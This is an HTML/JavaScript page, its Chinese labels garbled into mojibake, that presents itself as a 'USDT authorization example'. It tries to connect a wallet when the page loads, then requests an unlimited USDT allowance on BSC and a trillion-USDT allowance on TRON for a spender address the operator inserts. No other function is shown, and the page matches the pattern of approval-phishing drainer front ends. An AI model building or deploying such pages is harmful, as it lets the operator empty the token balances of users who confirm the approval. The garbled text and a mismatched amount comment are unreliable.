<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT æˆæƒç¤ºä¾‹</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
            text-align: center;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            color: white;
            background-color: #007bff;
            transition: background-color 0.3s;
        }
        button:hover:not(:disabled) {
            background-color: #0056b3;
        }
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            min-height: 40px;
            font-weight: bold;
        }
        .connected {
            background-color: #e6ffe6;
            color: #008000;
        }
        .error {
            background-color: #ffe6e6;
            color: #cc0000;
        }
        .warning {
            color: orange;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>USDT ä»£å¸æˆæƒç¤ºä¾‹</h1>
    
    <div id="status" class="status">æœªè¿æ¥é’±åŒ…</div>
    
    <button onclick="connectWalletAndCheckNetwork()">è¿æ¥é’±åŒ… (BSC/TRON)</button>
    <button id="approve-button" onclick="approveToken()" disabled>æˆæƒ USDT ä»£å¸</button>

    <p style="margin-top: 30px;">
        <strong class="warning">--- ğŸš¨ æ›¿æ¢è­¦å‘Š ğŸš¨ ---</strong>
        <br>
        <strong>æ‚¨å¿…é¡»æ›¿æ¢ä»¥ä¸‹ä»£ç ä¸­çš„ `YOUR_BSC_SPENDER_ADDRESS` å’Œ `YOUR_TRON_SPENDER_ADDRESS` ä¸ºæ‚¨çš„ç›®æ ‡åˆçº¦åœ°å€ï¼</strong>
    </p>
</div>

<script>
    // --- å¼•å…¥ Web3.js åº“ (ç”¨äº EVM äº¤äº’) ---
    // <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"></script> å·²åœ¨å¤´éƒ¨å¼•å…¥

    // --- é…ç½®ï¼šUSDT ä»£å¸åˆçº¦åœ°å€ ---
    // BSC (BEP-20) USDT åˆçº¦åœ°å€
    const BSC_TOKEN_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
    // TRON (TRC-20) USDT åˆçº¦åœ°å€ (åœ¨ TronLink ä¸­æ˜¯ TXYZL...ï¼Œä½†åœ¨åˆçº¦è°ƒç”¨æ—¶ä½¿ç”¨å…¶ HEX åœ°å€)
    // å®é™…è°ƒç”¨æ—¶ï¼ŒTronLink ä¼šè‡ªåŠ¨å¤„ç†ï¼Œè¿™é‡Œä½¿ç”¨å…¶ base58 åœ°å€ä¾›å‚è€ƒï¼Œä½†æ›´å¸¸ç”¨çš„æ˜¯ T... å¼€å¤´çš„
    const TRON_TOKEN_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
    
    // ğŸš¨ ç›®æ ‡æˆæƒåœ°å€ (SPENDER) ğŸš¨
    // ** å¿…é¡»æ›¿æ¢ä¸ºæ‚¨çš„ç›®æ ‡åˆçº¦åœ°å€ **
    const BSC_SPENDER_ADDRESS = 'YOUR_BSC_SPENDER_ADDRESS';
    const TRON_SPENDER_ADDRESS = 'YOUR_TRON_SPENDER_ADDRESS';

    // æˆæƒé‡‘é¢ (è¿™é‡Œä»¥ä¸€ä¸ªéå¸¸å¤§çš„æ•°å­—ä¸ºä¾‹ï¼Œä»£è¡¨æ— é™æˆæƒ)
    // EVM (BSC): 2^256 - 1 æ˜¯å¸¸ç”¨çš„â€œæ— é™â€æˆæƒå€¼ã€‚
    const MAX_APPROVAL_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; 
    // TRON (USDT ç²¾åº¦ä¸º 6): 10^24 å³æˆæƒ 1 ä¸‡äº¿ (1,000,000,000,000) USDT
    const MAX_APPROVAL_AMOUNT_TRON_SUN = '1000000000000000000'; 

    let currentNetwork = null;
    let currentAccount = null;

    // --- çŠ¶æ€æ›´æ–°å‡½æ•° ---
    function updateStatus(message, isError = false) {
        const statusDiv = document.getElementById('status');
        statusDiv.textContent = message;
        statusDiv.className = isError ? 'status error' : 'status connected';
        document.getElementById('approve-button').disabled = !currentAccount;
    }

    // --- è¿æ¥é’±åŒ…å’Œæ£€æŸ¥ç½‘ç»œ ---
    async function connectWalletAndCheckNetwork() {
        // 1. æ£€æŸ¥ TRON é’±åŒ… (TronLink)
        if (window.tronWeb) {
            currentNetwork = 'TRON';
            await connectTron();
            return;
        }

        // 2. æ£€æŸ¥ EVM é’±åŒ… (BSC - MetaMask/TrustWalletç­‰)
        if (window.ethereum) {
            currentNetwork = 'BSC'; // å‡è®¾é»˜è®¤æ˜¯ BSCï¼Œæ–¹ä¾¿åç»­è¿æ¥/åˆ‡æ¢é€»è¾‘
            await connectEVM();
            return;
        }
        
        // 3. éƒ½æ²¡æœ‰æ‰¾åˆ°
        currentNetwork = null;
        currentAccount = null;
        updateStatus('æœªæ£€æµ‹åˆ°å…¼å®¹çš„é’±åŒ…æ’ä»¶ (å¦‚ TronLink æˆ– MetaMask)ã€‚', true);
        document.getElementById('approve-button').disabled = true;
    }

    // --- EVM (BSC) è¿æ¥é€»è¾‘ ---
    async function connectEVM() {
        try {
            updateStatus('æ­£åœ¨è¯·æ±‚è¿æ¥ BSC é’±åŒ…...');
            
            // è¯·æ±‚è¿æ¥
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            currentAccount = accounts[0];
            
            // è·å–å½“å‰ ChainID
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            if (chainId !== '0x38' && chainId !== '56') { // '0x38' æˆ– 56 æ˜¯ BSC ä¸»ç½‘çš„ Chain ID
                updateStatus(`å·²è¿æ¥åˆ°é’±åŒ…ï¼Œä½†å½“å‰ç½‘ç»œä¸æ˜¯ BSC ä¸»ç½‘ (ChainID: ${chainId})ã€‚è¯·åœ¨é’±åŒ…ä¸­åˆ‡æ¢åˆ° BSCã€‚`, true);
                document.getElementById('approve-button').disabled = true;
                return;
            }

            updateStatus(`å·²è¿æ¥åˆ° BSC (USDT)ï¼Œåœ°å€: ${currentAccount.substring(0, 6)}...${currentAccount.slice(-4)}`);
        } catch (error) {
            console.error(error);
            currentAccount = null;
            updateStatus(`BSC é’±åŒ…è¿æ¥å¤±è´¥: ${error.message || error.toString()}`, true);
        }
    }

    // --- TRON (TRX) è¿æ¥é€»è¾‘ ---
    async function connectTron() {
        try {
            updateStatus('æ­£åœ¨ç­‰å¾… TRON é’±åŒ…å°±ç»ª...');

            if (!window.tronWeb.ready) {
                // ç­‰å¾… TronLink æ³¨å…¥å’Œå°±ç»ª
                let isReady = false;
                await new Promise((resolve, reject) => {
                    const checkInterval = setInterval(() => {
                        if (window.tronWeb && window.tronWeb.ready) {
                            clearInterval(checkInterval);
                            resolve();
                        }
                    }, 100);
                    // 10ç§’ååœæ­¢ç­‰å¾…ï¼Œé˜²æ­¢æ— é™å¾ªç¯
                    setTimeout(() => {
                        clearInterval(checkInterval);
                        if (!window.tronWeb.ready) {
                           reject(new Error("TronLink é’±åŒ…è¶…æ—¶æˆ–æœªè§£é”ã€‚"));
                        }
                    }, 10000); 
                });
            }

            currentAccount = window.tronWeb.defaultAddress.base58;
            if (currentAccount) {
                 updateStatus(`å·²è¿æ¥åˆ° TRON (USDT)ï¼Œåœ°å€: ${currentAccount.substring(0, 6)}...${currentAccount.slice(-4)}`);
            } else {
                 throw new Error("TronLink é’±åŒ…å·²å®‰è£…ä½†æœªè¿æ¥æˆ–æœªè§£é”ã€‚");
            }
        } catch (error) {
            console.error(error);
            currentAccount = null;
            updateStatus(`TRON é’±åŒ…è¿æ¥å¤±è´¥: ${error.message || error.toString()}`, true);
        }
    }


    // --- ä»£å¸æˆæƒé€»è¾‘ (åˆ†å‘å™¨) ---
    async function approveToken() {
        if (!currentAccount) {
            updateStatus('è¯·å…ˆè¿æ¥é’±åŒ…ï¼', true);
            return;
        }

        if (currentNetwork === 'BSC') {
            await approveBSCToken();
        } else if (currentNetwork === 'TRON') {
            await approveTRONToken();
        } else {
            updateStatus('è¯·è¿æ¥åˆ° BSC æˆ– TRON é’±åŒ…ã€‚', true);
        }
    }

    // --- BSC (EVM) ä»£å¸æˆæƒå®ç° ---
    async function approveBSCToken() {
        if (!window.ethereum || typeof Web3 === 'undefined') {
            updateStatus('æœªæ‰¾åˆ° Web3 æä¾›è€…ã€‚è¯·ç¡®ä¿æ‚¨åœ¨æ”¯æŒ EVM çš„é’±åŒ…ä¸­æ‰“å¼€ã€‚', true);
            return;
        }

        if (BSC_SPENDER_ADDRESS === 'YOUR_BSC_SPENDER_ADDRESS') {
             updateStatus('ğŸš¨ é”™è¯¯ï¼šè¯·æ›¿æ¢ä»£ç ä¸­çš„ BSC_SPENDER_ADDRESS ä¸ºæ‚¨çš„ç›®æ ‡åˆçº¦åœ°å€ã€‚', true);
             return;
        }
        
        updateStatus('æ­£åœ¨è¯·æ±‚ BSC (USDT) ä»£å¸æˆæƒ...');

        // æœ€å° ERC-20 ABIï¼ŒåªåŒ…å« approve å‡½æ•°
        const abi = [
            {"constant": false, "inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "type": "function"}
        ];

        try {
            const web3 = new Web3(window.ethereum);
            const tokenContract = new web3.eth.Contract(abi, BSC_TOKEN_ADDRESS);
            
            // è°ƒç”¨ USDT (BEP-20) åˆçº¦çš„ approve æ–¹æ³•
            const transaction = await tokenContract.methods.approve(
                BSC_SPENDER_ADDRESS, 
                MAX_APPROVAL_AMOUNT_EVM // æˆæƒæ— é™é¢
            ).send({ from: currentAccount });

            updateStatus(`BSC æˆæƒäº¤æ˜“å·²å‘é€ï¼è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤ã€‚äº¤æ˜“å“ˆå¸Œ: ${transaction.transactionHash.substring(0, 10)}...`);
            alert('BSC é’±åŒ…å¼¹çª—å·²å¼¹å‡ºï¼Œè¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤æˆæƒï¼');

        } catch (error) {
            console.error("BSC æˆæƒå¤±è´¥:", error);
            if (error.code === 4001) {
                updateStatus('BSC æˆæƒè¢«ç”¨æˆ·æ‹’ç»ã€‚', true);
            } else {
                updateStatus(`BSC æˆæƒå¤±è´¥: ${error.message || error.toString()}`, true);
            }
        }
    }

    // --- TRON (TRX) ä»£å¸æˆæƒå®ç° ---
    async function approveTRONToken() {
        if (!window.tronWeb || !window.tronWeb.ready) {
            updateStatus('TronLink é’±åŒ…æœªå°±ç»ªã€‚è¯·ç¡®ä¿å·²å®‰è£…å¹¶è§£é”ã€‚', true);
            return;
        }

        if (TRON_SPENDER_ADDRESS === 'YOUR_TRON_SPENDER_ADDRESS') {
             updateStatus('ğŸš¨ é”™è¯¯ï¼šè¯·æ›¿æ¢ä»£ç ä¸­çš„ TRON_SPENDER_ADDRESS ä¸ºæ‚¨çš„ç›®æ ‡åˆçº¦åœ°å€ã€‚', true);
             return;
        }
        
        updateStatus('æ­£åœ¨è¯·æ±‚ TRON (USDT) ä»£å¸æˆæƒ...');
        
        try {
            const contract = await window.tronWeb.contract().at(TRON_TOKEN_ADDRESS);

            // è°ƒç”¨ USDT (TRC-20) åˆçº¦çš„ approve æ–¹æ³•
            // å‚æ•°: spender åœ°å€, æˆæƒé‡‘é¢ (æœ€å°å•ä½: 1 USDT = 10^6 SUN/æœ€å°å•ä½)
            const result = await contract.approve(
                TRON_SPENDER_ADDRESS, 
                MAX_APPROVAL_AMOUNT_TRON_SUN // æˆæƒ 1 ä¸‡äº¿ USDT (10^24 æœ€å°å•ä½)
            ).send({
                feeLimit: 100000000, // è´¹ç”¨ä¸Šé™ (å•ä½: SUN)
                callValue: 0,
                shouldPollResponse: true
            });

            if (result.txid) {
                 updateStatus(`TRON æˆæƒäº¤æ˜“å·²å‘é€ï¼è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤ã€‚äº¤æ˜“å“ˆå¸Œ: ${result.txid.substring(0, 10)}...`);
                 alert('TRON é’±åŒ…å¼¹çª—å·²å¼¹å‡ºï¼Œè¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤æˆæƒï¼');
            } else {
                 updateStatus('TRON æˆæƒè¯·æ±‚å·²å‘é€ï¼Œè¯·æ£€æŸ¥ TronLink é’±åŒ…ã€‚', false);
            }
            
        } catch (error) {
            console.error("TRON æˆæƒå¤±è´¥:", error);
             if (error.message && error.message.includes('User cancelled')) {
                updateStatus('TRON æˆæƒè¢«ç”¨æˆ·æ‹’ç»ã€‚', true);
            } else {
                updateStatus(`TRON æˆæƒå¤±è´¥: ${error.message || error.toString()}`, true);
            }
        }
    }

    // é¡µé¢åŠ è½½å®Œæˆåè‡ªåŠ¨å°è¯•è¿æ¥
    document.addEventListener('DOMContentLoaded', () => {
        // ç›‘å¬ EVM è´¦æˆ·å’Œç½‘ç»œå˜åŒ– (MetaMaskç­‰)
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', connectWalletAndCheckNetwork);
            window.ethereum.on('chainChanged', connectWalletAndCheckNetwork);
        }
        
        // é¦–æ¬¡åŠ è½½å°è¯•è¿æ¥
        connectWalletAndCheckNetwork();
    });
</script>
</body>
</html>